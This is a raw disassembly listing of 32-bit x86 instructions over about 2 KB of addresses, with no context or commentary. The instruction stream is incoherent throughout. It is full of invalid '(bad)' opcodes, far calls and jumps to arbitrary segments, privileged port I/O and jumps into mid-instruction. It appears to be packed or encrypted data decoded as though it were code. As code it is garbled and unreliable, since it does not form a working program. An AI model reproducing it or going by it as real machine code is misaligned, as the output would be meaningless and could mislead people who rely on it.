  41989a:	adc    dl,BYTE PTR [eax+0x8996617]
  4198a0:	pop    ebp
  4198a1:	mov    edi,0x90dac137
  4198a6:	sub    DWORD PTR [ecx+0x3d],0x72
  4198aa:	ret    
  4198ab:	or     eax,0xd2e14d9c
  4198b0:	xor    bl,BYTE PTR [ebx-0x28]
  4198b3:	dec    ebp
  4198b4:	je     0x419920
  4198b6:	sbb    al,BYTE PTR [ebp-0x61]
  4198b9:	test   al,0xee
  4198bb:	retf   0x4d28
  4198be:	aam    0x9f
  4198c0:	lods   al,BYTE PTR ds:[esi]
  4198c1:	jb     0x4198ea
  4198c3:	cs mov edx,0x7c082274
  4198c9:	jbe    0x4198d7
  4198cb:	fwait
  4198cc:	js     0x4198f6
  4198ce:	in     al,0x37
  4198d0:	inc    ecx
  4198d1:	cmp    BYTE PTR [ebx+eiz*8],ch
  4198d4:	sar    BYTE PTR [edx-0x584cae27],0x87
  4198db:	mov    BYTE PTR [edx],dh
  4198dd:	adc    ah,BYTE PTR [edi+0x63a2b276]
  4198e3:	dec    edi
  4198e4:	mov    ebx,0x67d710fc
  4198e9:	pushf  
  4198ea:	into   
  4198eb:	or     al,0xb4
  4198ed:	push   es
  4198ee:	add    eax,0x2cd1fe60
  4198f3:	xchg   ebp,eax
  4198f4:	xchg   ebp,eax
  4198f5:	fmul   QWORD PTR [ecx+eiz*4]
  4198f8:	pop    esp
  4198f9:	shl    BYTE PTR [edi+0x64a469b1],1
  4198ff:	dec    edi
  419900:	fs std 
  419902:	mov    ch,0x77
  419904:	test   al,0x57
  419906:	mov    dl,al
  419908:	pop    ebp
  419909:	xchg   edx,eax
  41990a:	test   DWORD PTR [ebx-0x667ba767],esi
  419910:	push   ebp
  419911:	div    edx
  419913:	stos   DWORD PTR es:[edi],eax
  419914:	jns    0x4198e5
  419916:	call   0xd9aa:0x7406d1bc
  41991d:	jl     0x4198ba
  41991f:	inc    edi
  419920:	inc    eax
  419921:	inc    ebx
  419922:	mov    al,ds:0xf9c33ca3
  419927:	sbb    DWORD PTR [edi-0x476d0f2],0x53750ee
  419931:	imul   BYTE PTR [esi+0x3c]
  419934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419935:	jnp    0x41990b
  419937:	sbb    al,0x97
  419939:	sub    al,0xc0
  41993b:	data16 or al,0x3b
  41993e:	dec    edx
  41993f:	inc    edx
  419940:	out    0x6c,al
  419942:	in     al,0x78
  419944:	xchg   edi,eax
  419945:	cmc    
  419946:	xor    DWORD PTR [eax-0x59c8e0f7],ebx
  41994c:	xchg   bh,cl
  41994e:	jnp    0x41994d
  419950:	sbb    al,0xaf
  419952:	push   es
  419953:	std    
  419954:	imul   esi,DWORD PTR [edi],0xcbd6a790
  41995a:	out    dx,al
  41995b:	lods   al,BYTE PTR ds:[esi]
  41995c:	fld    QWORD PTR [esi+0x3d77708]
  419962:	mov    al,ds:0x89ad3549
  419967:	sub    DWORD PTR [eax],ebx
  419969:	pusha  
  41996a:	in     al,dx
  41996b:	cmp    al,BYTE PTR [edx]
  41996d:	jb     0x419928
  41996f:	cmp    al,0x78
  419971:	cmp    DWORD PTR [esi+eax*4-0x3782cf1a],0xb209f35b
  41997c:	push   0x18d27622
  419981:	dec    eax
  419982:	fild   WORD PTR [esi-0x6322a12]
  419988:	pushf  
  419989:	inc    ebx
  41998a:	xor    BYTE PTR [ebx-0x2a7d5e24],bl
  419990:	out    0xae,al
  419992:	dec    ebp
  419993:	sub    DWORD PTR [esi+0x65],edi
  419996:	arpl   WORD PTR [eax-0x48],di
  419999:	jecxz  0x419942
  41999b:	push   edi
  41999c:	lahf   
  41999d:	imul   eax,ebp,0xfffffffd
  4199a0:	cld    
  4199a1:	stos   DWORD PTR es:[edi],eax
  4199a2:	imul   esi,ebp,0x47d7a40a
  4199a8:	mov    WORD PTR gs:[edx-0x21],ss
  4199ac:	leave  
  4199ad:	inc    ebx
  4199ae:	pop    edi
  4199af:	data16 int3 
  4199b1:	jl     0x4199c0
  4199b3:	dec    ecx
  4199b4:	leave  
  4199b5:	frstor [esi+edi*2+0x7016916]
  4199bc:	fbstp  TBYTE PTR [ebx]
  4199be:	inc    esp
  4199bf:	mov    ah,0xc5
  4199c1:	stos   DWORD PTR es:[edi],eax
  4199c2:	jg     0x419a21
  4199c4:	adc    bl,cl
  4199c6:	cmp    esp,DWORD PTR [esp+eax*4+0x7b4b4ab2]
  4199cd:	and    eax,0x3785ce80
  4199d2:	imul   BYTE PTR [edx-0x56]
  4199d5:	lahf   
  4199d6:	sub    BYTE PTR [edx-0x3e17d92f],0x5a
  4199dd:	dec    ebx
  4199de:	dec    ebx
  4199df:	xchg   edx,eax
  4199e0:	repnz loop 0x419a32
  4199e3:	loop   0x41996a
  4199e5:	xor    ch,ch
  4199e7:	or     cl,BYTE PTR [esi+edx*1+0x8ff92cd]
  4199ee:	adc    ebx,DWORD PTR [eax-0x61c51cfa]
  4199f4:	fdiv   QWORD PTR [ecx]
  4199f6:	inc    esi
  4199f7:	(bad)  
  4199f8:	push   esi
  4199f9:	push   0xffffffe3
  4199fb:	in     al,dx
  4199fc:	sti    
  4199fd:	jp     0x419a77
  4199ff:	mov    DWORD PTR [eax-0x4921728d],esi
  419a05:	repz adc ah,BYTE PTR [eax]
  419a08:	retf   
  419a09:	sub    al,0x4e
  419a0b:	std    
  419a0c:	fnstcw WORD PTR [ebp+0x43]
  419a0f:	push   eax
  419a10:	dec    eax
  419a11:	fimul  WORD PTR [ebx+0x7fef1f18]
  419a17:	lock retf 0x8071
  419a1b:	ret    0x4924
  419a1e:	call   0x658e:0xea47333e
  419a25:	xchg   edi,eax
  419a26:	fs addr16 cwde 
  419a29:	or     ebx,DWORD PTR [esi+eax*2+0x31]
  419a2d:	mov    BYTE PTR [ecx],dl
  419a2f:	(bad)  
  419a30:	jg     0x419a3f
  419a32:	pop    edi
  419a33:	sahf   
  419a34:	mov    cl,0xba
  419a36:	(bad)  
  419a37:	mov    BYTE PTR [edx+0x4844e1b2],bh
  419a3d:	add    eax,0xe66dc3f4
  419a42:	imul   esp,DWORD PTR [ebx+esi*1-0x29],0x50
  419a47:	or     edx,DWORD PTR [eax+0x8]
  419a4a:	push   eax
  419a4b:	sub    eax,0xba3f8210
  419a50:	imul   bp,WORD PTR [edi],0x7c7d
  419a55:	sbb    al,0x2c
  419a57:	add    dl,BYTE PTR [eax]
  419a59:	(bad)  
  419a5b:	in     eax,dx
  419a5c:	test   eax,0xf91a375f
  419a61:	aad    0x5d
  419a63:	mov    edx,0xa6d7166a
  419a68:	push   eax
  419a69:	mov    edx,0x828ea836
  419a6e:	add    ah,BYTE PTR [esp]
  419a71:	sub    ch,BYTE PTR [ecx+0x94da724]
  419a77:	adc    DWORD PTR [ecx],esp
  419a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a7a:	mov    cl,0x4f
  419a7c:	mov    edx,0xc11baac5
  419a81:	add    DWORD PTR [ebx+0x5d],esi
  419a84:	icebp  
  419a85:	mov    ds:0x9582267a,al
  419a8a:	and    bl,cl
  419a8c:	daa    
  419a8d:	mov    WORD PTR [edi-0x38],gs
  419a90:	add    DWORD PTR [edx+0x1ca1fe5e],ebx
  419a96:	dec    ebx
  419a97:	pop    esi
  419a98:	sub    DWORD PTR [ebp-0x106116b5],ebx
  419a9e:	mov    ah,0xbc
  419aa0:	xchg   edi,eax
  419aa1:	xlat   BYTE PTR es:[ebx]
  419aa3:	mov    WORD PTR [edx],cs
  419aa5:	xchg   ecx,eax
  419aa6:	in     al,dx
  419aa7:	xlat   BYTE PTR ds:[ebx]
  419aa8:	xchg   esp,eax
  419aa9:	retf   
  419aaa:	div    DWORD PTR [edi+esi*4-0x4]
  419aae:	out    0x72,eax
  419ab0:	and    dh,ah
  419ab2:	mov    edx,0xd4ef4068
  419ab7:	and    ebp,ebx
  419ab9:	sbb    eax,0xba40b53a
  419abe:	sbb    ah,ah
  419ac0:	outs   dx,BYTE PTR ds:[esi]
  419ac1:	(bad)  
  419ac2:	in     al,0xb3
  419ac4:	mov    dl,0xf6
  419ac6:	lods   eax,DWORD PTR ds:[esi]
  419ac7:	mov    cl,ch
  419ac9:	or     BYTE PTR [esi+0x0],ah
  419acc:	add    ebp,DWORD PTR [esi+0x180604b9]
  419ad2:	repz adc eax,0xbe14e3d6
  419ad8:	mov    dl,0x7a
  419ada:	jbe    0x419ad3
  419adc:	xor    edx,esp
  419ade:	xor    eax,0xe3c0465c
  419ae3:	add    al,0x85
  419ae5:	test   DWORD PTR [ecx+0x35],ecx
  419ae8:	xchg   esi,eax
  419ae9:	retf   0x50a0
  419aec:	cmp    eax,0xc45c02ea
  419af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419af2:	push   0x47
  419af4:	jge    0x419b38
  419af6:	ret    
  419af7:	das    
  419af8:	sti    
  419af9:	cmp    al,0xf1
  419afb:	and    eax,eax
  419afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419afe:	push   edx
  419aff:	sbb    cl,al
  419b01:	sub    cl,BYTE PTR [ebx]
  419b03:	call   0xeafdc704
  419b08:	ins    DWORD PTR es:[edi],dx
  419b09:	mov    DWORD PTR [edi],edx
  419b0b:	push   0x9b6dec06
  419b10:	add    DWORD PTR [edi+edi*2+0x35],esp
  419b14:	inc    eax
  419b15:	push   ebp
  419b16:	add    al,0x31
  419b18:	mov    ds:0x2e1f0fc9,eax
  419b1d:	xor    eax,0xe5e95cbb
  419b22:	pushf  
  419b23:	push   ss
  419b24:	cmp    esi,DWORD PTR [edx-0x4569fffe]
  419b2a:	lahf   
  419b2b:	mov    ecx,0xcd751aa6
  419b30:	mov    ch,0xb3
  419b32:	jmp    0x7970:0xcb895eba
  419b39:	mov    al,gs:0x4ceebc62
  419b3f:	retf   
  419b40:	jbe    0x419b79
  419b42:	xor    bl,ch
  419b44:	pop    esp
  419b45:	aam    0xb1
  419b47:	mov    ebp,0xa903e8a5
  419b4c:	cmp    al,0x3a
  419b4e:	and    edi,DWORD PTR [edx+0x15d86e89]
  419b54:	jecxz  0x419bb0
  419b56:	js     0x419bca
  419b58:	js     0x419b28
  419b5a:	sahf   
  419b5b:	call   0x94d9:0x8978f945
  419b62:	retf   
  419b63:	mov    bh,0xe8
  419b65:	jnp    0x419b6c
  419b67:	pusha  
  419b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b69:	pop    eax
  419b6a:	sbb    edx,edx
  419b6c:	daa    
  419b6d:	dec    edx
  419b6e:	dec    ecx
  419b6f:	sbb    al,0xf2
  419b71:	mov    cl,0x6f
  419b73:	ret    0x945c
  419b76:	addr16 icebp 
  419b78:	(bad)  [ebx-0x53]
  419b7b:	and    eax,0x3d338d91
  419b80:	push   edx
  419b81:	mov    edx,0x1da1992b
  419b86:	stc    
  419b87:	mov    dh,ah
  419b89:	pop    ss
  419b8a:	addr16 in eax,dx
  419b8c:	cvtps2pi mm6,xmm0
  419b8f:	jl     0x419bc7
  419b91:	jne    0x419beb
  419b93:	bound  ebp,QWORD PTR ds:0x95ede149
  419b99:	mov    bh,0xe6
  419b9b:	mov    WORD PTR [esi+0x1dc1da49],es
  419ba1:	outs   dx,BYTE PTR ds:[esi]
  419ba2:	(bad)  
  419ba3:	clc    
  419ba4:	push   esi
  419ba5:	xchg   ecx,eax
  419ba6:	adc    eax,0x71a5d08
  419bab:	push   edi
  419bac:	inc    edi
  419bad:	jmp    0x4614:0x8976fc30
  419bb4:	popf   
  419bb5:	nop
  419bb6:	xchg   ecx,eax
  419bb7:	rol    BYTE PTR [edi+eiz*4],1
  419bba:	cmp    eax,0x6f379260
  419bbf:	adc    ah,BYTE PTR [esi]
  419bc1:	stc    
  419bc2:	stos   BYTE PTR es:[edi],al
  419bc3:	fstp   QWORD PTR [esi+0x21]
  419bc6:	dec    eax
  419bc7:	fst    st(0)
  419bc9:	xchg   esi,eax
  419bca:	jl     0x419ba6
  419bcc:	retf   
  419bcd:	cmp    ah,ah
  419bcf:	push   edx
  419bd0:	imul   ecx,DWORD PTR [edi],0xffffffb9
  419bd3:	lock in eax,0x9a
  419bd6:	sub    DWORD PTR [edi+0x37],edx
  419bd9:	jp     0x419c2b
  419bdb:	sub    eax,0x4c25d9ca
  419be0:	pushf  
  419be1:	int    0x5a
  419be3:	cmp    ch,BYTE PTR [ebp+0x1a]
  419be6:	mov    dh,0xd6
  419be8:	and    DWORD PTR [esi+0x7a3da78],edx
  419bee:	sbb    al,0xa5
  419bf0:	dec    ecx
  419bf1:	mov    al,ds:0x64bdf152
  419bf6:	cs pop ecx
  419bf8:	fidivr DWORD PTR [ebx+0x752dff9d]
  419bfe:	retf   0xf7e3
  419c01:	mov    bh,0xbe
  419c03:	sub    DWORD PTR [eax+0x68f12292],esp
  419c09:	xchg   ebp,eax
  419c0a:	arpl   WORD PTR [esi+0x5873e28c],bp
  419c10:	retf   0xa6e2
  419c13:	shl    esp,0x93
  419c16:	in     eax,dx
  419c17:	lsl    edi,di
  419c1a:	sbb    BYTE PTR [esp+eiz*2+0x24],0xe5
  419c1f:	shl    ch,cl
  419c21:	lock cmp edi,DWORD PTR [eax]
  419c24:	mov    edi,0x3776771e
  419c29:	sbb    BYTE PTR [ebp-0x5de02297],dl
  419c2f:	xchg   edx,eax
  419c30:	add    BYTE PTR [esi+0x1e4aa687],bh
  419c36:	iret   
  419c37:	xchg   ecx,eax
  419c38:	adc    eax,0xb6a04c37
  419c3d:	pop    esp
  419c3e:	push   esi
  419c3f:	or     DWORD PTR [esi],edx
  419c41:	(bad)  
  419c42:	call   0x4902:0x25a6785d
  419c49:	hlt    
  419c4a:	jnp    0x419c38
  419c4c:	mov    BYTE PTR [edx],al
  419c4e:	lahf   
  419c4f:	mov    ebx,0xeea0e6de
  419c54:	jmp    0x419c1f
  419c56:	ins    BYTE PTR es:[edi],dx
  419c57:	mov    esi,0xb5a8764c
  419c5c:	int    0x13
  419c5e:	jns    0x419c15
  419c60:	mov    ecx,0xce7d8339
  419c65:	push   0x50639a80
  419c6a:	cmp    dh,BYTE PTR [esi+0x55]
  419c6d:	inc    eax
  419c6e:	lods   eax,DWORD PTR ds:[esi]
  419c6f:	(bad)  
  419c70:	std    
  419c71:	rol    eax,cl
  419c73:	adc    BYTE PTR [edi-0x66],al
  419c76:	shl    ecx,cl
  419c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c79:	sbb    edx,ecx
  419c7b:	pop    es
  419c7c:	inc    ebp
  419c7d:	push   esi
  419c7e:	xor    DWORD PTR [edi+0x55],esp
  419c81:	js     0x419c6c
  419c83:	sub    eax,0xb677ec90
  419c88:	inc    ecx
  419c89:	es jecxz 0x419cd3
  419c8c:	ja     0x419c84
  419c8e:	mov    ds:0xd81f9985,eax
  419c93:	mov    bh,BYTE PTR [edx+edi*8+0x2e]
  419c97:	mov    BYTE PTR [edi],bl
  419c99:	fmul   DWORD PTR [ebx-0x13de4aeb]
  419c9f:	and    eax,DWORD PTR [edi+0x1aaeeb7c]
  419ca5:	mov    bl,0xee
  419ca7:	jae    0x419cab
  419ca9:	sbb    esp,DWORD PTR [ebp-0x18fc5097]
  419caf:	mov    ds:0xedbdbd54,eax
  419cb4:	inc    BYTE PTR [esp+ebp*4]
  419cb7:	out    dx,al
  419cb8:	mov    edx,0xed13d886
  419cbd:	ss and eax,esp
  419cc0:	sbb    DWORD PTR [ebx+eiz*4],esp
  419cc3:	jmp    0x419cc7
  419cc5:	fsub   QWORD PTR [ebx-0x66]
  419cc8:	cli    
  419cc9:	inc    ecx
  419cca:	add    ebp,DWORD PTR [ebp+ebx*8+0x4c]
  419cce:	and    al,0x62
  419cd0:	(bad)  
  419cd1:	pop    esp
  419cd2:	mov    ch,0xd5
  419cd4:	xor    DWORD PTR [ebp-0xad2f6cd],ecx
  419cda:	ret    0xf1d2
  419cdd:	and    BYTE PTR [edx+0x57f46a08],0x5
  419ce4:	stos   DWORD PTR es:[edi],eax
  419ce5:	fdiv   DWORD PTR [edx+0x27]
  419ce8:	and    DWORD PTR [ebx-0x6c329adf],edx
  419cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cef:	popf   
  419cf0:	fadd   st,st(2)
  419cf2:	adc    DWORD PTR [ebx+0x38],edx
  419cf5:	(bad)  
  419cf6:	pop    esi
  419cf7:	jbe    0x419cec
  419cf9:	xchg   esi,eax
  419cfa:	add    dh,al
  419cfc:	js     0x419d51
  419cfe:	shr    DWORD PTR [edi],cl
  419d00:	adc    eax,DWORD PTR [ecx-0x41]
  419d03:	dec    edx
  419d04:	and    edx,ecx
  419d06:	jnp    0x419ccf
  419d08:	call   0x49821ffb
  419d0d:	pop    esp
  419d0e:	pop    edi
  419d0f:	and    ch,al
  419d11:	or     DWORD PTR [edx],0x35
  419d14:	out    dx,eax
  419d15:	inc    edi
  419d16:	adc    al,0xf9
  419d18:	or     esp,ebp
  419d1a:	push   edi
  419d1b:	cmp    eax,0xb9d8e7b3
  419d20:	gs jmp 0xa83c:0x4d0b7ba7
  419d28:	loopne 0x419d15
  419d2a:	fs stc 
  419d2c:	cli    
  419d2d:	(bad)  
  419d2e:	cld    
  419d2f:	inc    ecx
  419d30:	adc    esp,DWORD PTR [eax+0x402d665c]
  419d36:	out    0xdb,al
  419d38:	fdivr  st(2),st
  419d3a:	shl    DWORD PTR [esi+eiz*4+0x4b],0xa1
  419d3f:	xor    bh,0xe7
  419d42:	push   ds
  419d43:	mov    ds:0xd3fb3cdd,al
  419d48:	inc    ebx
  419d49:	je     0x419cf5
  419d4b:	out    dx,al
  419d4c:	or     al,0xf7
  419d4e:	call   0xe493:0x2979f8ac
  419d55:	js     0x419d48
  419d57:	sar    BYTE PTR [esi-0x30fba071],cl
  419d5d:	or     ah,BYTE PTR [esi]
  419d5f:	aam    0x1d
  419d61:	out    dx,al
  419d62:	outs   dx,BYTE PTR ds:[esi]
  419d63:	sub    bh,BYTE PTR [edx]
  419d65:	nop
  419d66:	push   ebp
  419d67:	sub    DWORD PTR [esi+0x62f65d1a],0xf2e1ebd
  419d71:	outs   dx,DWORD PTR ds:[esi]
  419d72:	ss stc 
  419d74:	or     al,0x41
  419d76:	shl    BYTE PTR [esi+0x6a24f12e],0x5
  419d7d:	dec    edx
  419d7e:	test   BYTE PTR [edi+0x42f28772],dh
  419d84:	cmp    al,0xe4
  419d86:	mov    ebx,0xdec44781
  419d8b:	outs   dx,DWORD PTR ds:[esi]
  419d8c:	mov    dl,0x2e
  419d8e:	dec    ebp
  419d8f:	loope  0x419d52
  419d91:	pop    edx
  419d92:	repnz push cs
  419d94:	fiadd  WORD PTR [edi+0x6d5199cb]
  419d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d9b:	or     eax,0x3d7c5fd5
  419da0:	inc    ebx
  419da1:	add    eax,0xcdcbee66
  419da6:	dec    edi
  419da7:	sub    BYTE PTR [edi-0x45],dh
  419daa:	repnz xlat BYTE PTR ds:[ebx]
  419dac:	fdiv   DWORD PTR [edi]
  419dae:	jmp    0x419ddd
  419db0:	int3   
  419db1:	orps   xmm2,xmm2
  419db4:	(bad)  
  419db5:	lock js 0x419dab
  419db8:	cdq    
  419db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dba:	imul   esp,DWORD PTR [ecx+eax*8-0x5],0x4e
  419dbf:	das    
  419dc0:	add    eax,0x8a340b94
  419dc5:	adc    ebx,edx
  419dc7:	aas    
  419dc8:	pop    ebx
  419dc9:	mov    dh,BYTE PTR [ecx-0x3d]
  419dcc:	int3   
  419dcd:	xor    BYTE PTR [ebx+0x59],cl
  419dd0:	loop   0x419d7a
  419dd2:	xor    BYTE PTR [ebp-0x3],dh
  419dd5:	cmp    eax,0xd445107f
  419dda:	enter  0xf6ad,0xbd
  419dde:	mov    eax,ds:0x599165e7
  419de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419de4:	lea    ecx,[esi]
  419de6:	add    bh,dh
  419de8:	test   ah,0x7e
  419deb:	mov    ds:0x7097ed96,al
  419df0:	jmp    0xd77c03c7
  419df5:	fwait
  419df6:	pop    edx
  419df7:	outs   dx,DWORD PTR ds:[esi]
  419df9:	rcl    BYTE PTR [ebp-0x4bb094c5],cl
  419dff:	inc    edi
  419e00:	mov    dl,BYTE PTR [esi-0x4a]
  419e03:	arpl   dx,dx
  419e05:	adc    al,0x2f
  419e07:	nop
  419e08:	imul   ebp,DWORD PTR [ebp+0x1a1a60da],0x77
  419e0f:	dec    esi
  419e10:	push   0x885dabed
  419e15:	pop    ebx
  419e16:	inc    ebx
  419e17:	mov    eax,ds:0x192992c8
  419e1c:	clc    
  419e1d:	pop    esi
  419e1e:	pop    eax
  419e1f:	cmp    ebx,DWORD PTR [edx-0x37]
  419e22:	and    esi,DWORD PTR [ebx]
  419e24:	ja     0x419e15
  419e26:	inc    eax
  419e27:	test   DWORD PTR [esi+eax*4+0x6c],esi
  419e2b:	sub    BYTE PTR gs:[ecx+0x6ced4721],cl
  419e32:	gs dec ebp
  419e34:	ror    DWORD PTR [edi+0x5080dace],cl
  419e3a:	mov    eax,ds:0x12dc25cb
  419e3f:	and    DWORD PTR [esi+0x1dd5d6d6],0xfffffff9
  419e46:	mov    bl,ch
  419e48:	into   
  419e49:	mov    cl,0x69
  419e4b:	outs   dx,BYTE PTR ds:[esi]
  419e4c:	retf   
  419e4d:	sub    DWORD PTR [ebp-0x6c],esp
  419e50:	outs   dx,BYTE PTR ds:[esi]
  419e51:	inc    esi
  419e52:	jecxz  0x419e04
  419e54:	adc    al,0x5e
  419e56:	(bad)  
  419e57:	push   edx
  419e58:	mov    edi,0xc51a473c
  419e5d:	and    al,BYTE PTR [edx-0x79d85112]
  419e63:	mov    esi,0x34120ef6
  419e68:	push   0xa1aa184f
  419e6d:	(bad)  
  419e6e:	cdq    
  419e6f:	xchg   BYTE PTR [edi+0x7d],ch
  419e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e73:	fbld   TBYTE PTR [ecx]
  419e75:	cld    
  419e76:	retf   0x2fb3
  419e79:	scas   eax,DWORD PTR es:[edi]
  419e7a:	outs   dx,DWORD PTR ds:[esi]
  419e7b:	jmp    0x79812a6e
  419e80:	adc    ah,BYTE PTR [esi+0x24737825]
  419e86:	xchg   BYTE PTR [ebx+0x16],dl
  419e89:	add    bh,BYTE PTR [ebx-0x69d62726]
  419e8f:	out    dx,eax
  419e90:	and    BYTE PTR [ebx+edi*8],al
  419e93:	pop    ds
  419e94:	lods   eax,DWORD PTR ds:[esi]
  419e95:	cmp    BYTE PTR [ebp-0x38],ch
  419e98:	xor    al,0x7b
  419e9a:	push   0x88288de3
  419e9f:	jg     0x419eec
  419ea1:	(bad)  
  419ea2:	sub    al,0x18
  419ea4:	out    0x1b,eax
  419ea6:	xchg   ebp,eax
  419ea7:	sub    edx,edx
  419ea9:	mov    bl,0x22
  419eab:	test   BYTE PTR [ebx-0x234a610f],cl
  419eb1:	daa    
  419eb2:	imul   ebx,esi,0xfbb57be6
  419eb8:	push   esp
  419eb9:	popf   
  419eba:	fwait
  419ebb:	push   edi
  419ebc:	cli    
  419ebd:	push   0x6a93ee
  419ec2:	cmp    eax,0x9ded986d
  419ec7:	fisub  DWORD PTR [edx]
  419ec9:	xor    ecx,DWORD PTR [ecx+0x30]
  419ecc:	xlat   BYTE PTR ds:[ebx]
  419ecd:	shr    BYTE PTR cs:[esi-0x6],0xd9
  419ed2:	pop    ebp
  419ed3:	xor    al,0xea
  419ed5:	pop    es
  419ed6:	ror    DWORD PTR [ecx+0x544c70d8],0xec
  419edd:	aam    0xde
  419edf:	(bad)  
  419ee0:	aad    0xd9
  419ee2:	popf   
  419ee3:	xor    BYTE PTR [eax-0x26578163],bl
  419ee9:	mov    ?,ecx
  419eeb:	jmp    DWORD PTR [ebx+0x6e]
  419eee:	dec    edi
  419eef:	cs jns 0x419f17
  419ef2:	adc    DWORD PTR [edi],esi
  419ef4:	stos   DWORD PTR es:[edi],eax
  419ef5:	inc    eax
  419ef6:	pavgb  mm4,QWORD PTR [edx-0x33]
  419efa:	(bad)  
  419efb:	(bad)  
  419efc:	or     eax,0xfbad600d
  419f01:	std    
  419f02:	pusha  
  419f03:	dec    edx
  419f04:	shl    BYTE PTR gs:[esi+0x1dd2aeeb],1
  419f0b:	and    dl,BYTE PTR [esi+0x3015be18]
  419f11:	fidivr DWORD PTR [esi+0x4eb1e010]
  419f17:	stos   DWORD PTR es:[edi],eax
  419f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f19:	(bad)  
  419f1a:	xor    dl,BYTE PTR [edx+0x70be6066]
  419f20:	leave  
  419f21:	fild   WORD PTR [edi+0x5f460b6c]
  419f27:	xor    eax,DWORD PTR [eax]
  419f29:	dec    esp
  419f2a:	leave  
  419f2b:	xchg   ebp,eax
  419f2c:	or     esp,DWORD PTR [ebx+esi*4]
  419f2f:	mov    WORD PTR [edx],es
  419f31:	lock pop ecx
  419f33:	test   eax,0xbba620fe
  419f38:	stc    
  419f39:	bound  esp,QWORD PTR [esi]
  419f3b:	dec    esi
  419f3c:	ret    
  419f3d:	inc    edx
  419f3e:	call   0xd4b8:0x4084f25a
  419f45:	lock (bad) 
  419f47:	into   
  419f48:	push   ebp
  419f49:	lds    eax,FWORD PTR [esi+0x17]
  419f4c:	xchg   eax,eax
  419f4e:	mov    esi,0x88278fc3
  419f53:	sub    eax,0xf85368e8
  419f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f59:	jmp    0x3d347082
  419f5e:	ret    
  419f5f:	xor    DWORD PTR [esp+esi*1+0x93d76ed],esi
  419f66:	sbb    DWORD PTR [edx],edi
  419f68:	(bad)  
  419f69:	repnz cli 
  419f6b:	mov    dh,0xa8
  419f6d:	dec    esp
  419f6e:	push   0x2a00826a
  419f73:	xchg   esp,eax
  419f74:	loopne 0x419fd2
  419f76:	(bad)  
  419f77:	in     al,0xd5
  419f79:	and    eax,esp
  419f7b:	jo     0x419f24
  419f7d:	push   esi
  419f7e:	retf   0x76f9
  419f81:	loopne 0x419f25
  419f83:	cs into 
  419f85:	stos   BYTE PTR es:[edi],al
  419f86:	mov    eax,0xb287f7f0
  419f8b:	shl    DWORD PTR [ebp-0x2b],cl
  419f8e:	hlt    
  419f8f:	jbe    0x419f36
  419f91:	fs pop ebp
  419f93:	sbb    bh,ah
  419f95:	repz call 0x7292665c
  419f9b:	push   ecx
  419f9c:	hlt    
  419f9d:	inc    esi
  419f9e:	imul   edi,DWORD PTR [ecx-0x4d73c1c6],0xffffffc1
  419fa5:	xor    BYTE PTR [ebp+0x13],cl
  419fa8:	ror    BYTE PTR ds:0xc881681e,1
  419fae:	sub    BYTE PTR [ebx],bl
  419fb0:	fnsave [ecx+0x791d412b]
  419fb6:	leave  
  419fb7:	mov    ds:0x404235e6,eax
  419fbc:	neg    DWORD PTR [ecx+0x3e]
  419fbf:	push   ebp
  419fc0:	inc    ebx
  419fc1:	push   edx
  419fc2:	jae    0x41a039
  419fc4:	push   es
  419fc5:	es jmp 0x1baea6e5
  419fcb:	stc    
  419fcc:	repz fst st(1)
  419fcf:	mov    cl,BYTE PTR [edx-0x78]
  419fd2:	mov    ds:0xaef35078,eax
  419fd7:	dec    edi
  419fd8:	cmp    ecx,DWORD PTR ds:0xad3219af
  419fde:	jg     0x419f7b
  419fe0:	fcmovnbe st,st(5)
  419fe2:	(bad)  
  419fe3:	aad    0x69
  419fe5:	mov    dl,0xd8
  419fe7:	xchg   edx,eax
  419fe8:	and    DWORD PTR [eax],ebp
  419fea:	dec    ebx
  419feb:	mov    ds:0x84e0c4cf,eax
  419ff0:	xor    dh,BYTE PTR [esi+ebp*8+0x68]
  419ff4:	fs cmp eax,0x73e5a0a6
  419ffa:	into   
  419ffb:	xchg   ebp,eax
  419ffc:	mov    al,ds:0x269fd09b
  41a001:	gs jp  0x41a00c
  41a004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a005:	popa   
  41a006:	jg     0x41a015
  41a008:	out    0x3b,eax
  41a00a:	cmc    
  41a00b:	(bad)  
  41a00c:	repnz inc edi
  41a00e:	imul   edx,DWORD PTR [esi-0x1d],0x38cfd9d9
  41a015:	xchg   edi,eax
  41a016:	xchg   DWORD PTR [ebx+eax*8],eax
  41a019:	ret    
  41a01a:	dec    ebp
  41a01b:	xchg   ecx,eax
  41a01c:	mov    bl,0xe1
  41a01e:	xchg   ebx,eax
  41a01f:	fs inc esi
  41a021:	fld    QWORD PTR [ecx-0x41879082]
  41a027:	call   DWORD PTR [ebx-0x277357d9]
  41a02d:	stc    
  41a02e:	jmp    0xd1a4:0x70757807
  41a035:	add    ah,BYTE PTR [esi]
  41a037:	add    bl,BYTE PTR [ebp+0x51]
  41a03a:	jo     0x41a0b0
  41a03c:	jge    0x419fde
  41a03e:	sub    ah,BYTE PTR [esi-0x216ad52]
  41a044:	cmp    DWORD PTR ds:0xc1c22a38,eax
  41a04a:	call   0x71d2:0x5ead37a
  41a051:	jno    0x41a02c
  41a053:	xor    al,0xf9
  41a055:	pusha  
  41a056:	(bad)  
  41a057:	fsubr  QWORD PTR [ebx]
  41a059:	add    DWORD PTR [edi+0x9dc212b],0x26
  41a060:	and    DWORD PTR [ebx+0x68],esi
  41a063:	in     eax,dx
  41a064:	scas   eax,DWORD PTR es:[edi]
  41a065:	and    esi,esp
  41a067:	retf   
  41a068:	jge    0x41a048
  41a06a:	inc    edx
  41a06b:	clc    
  41a06c:	mov    esi,0x47e60b0b
  41a071:	sub    esi,esp
  41a073:	mov    bh,0xf2
  41a075:	cld    
  41a076:	retf   0x77db
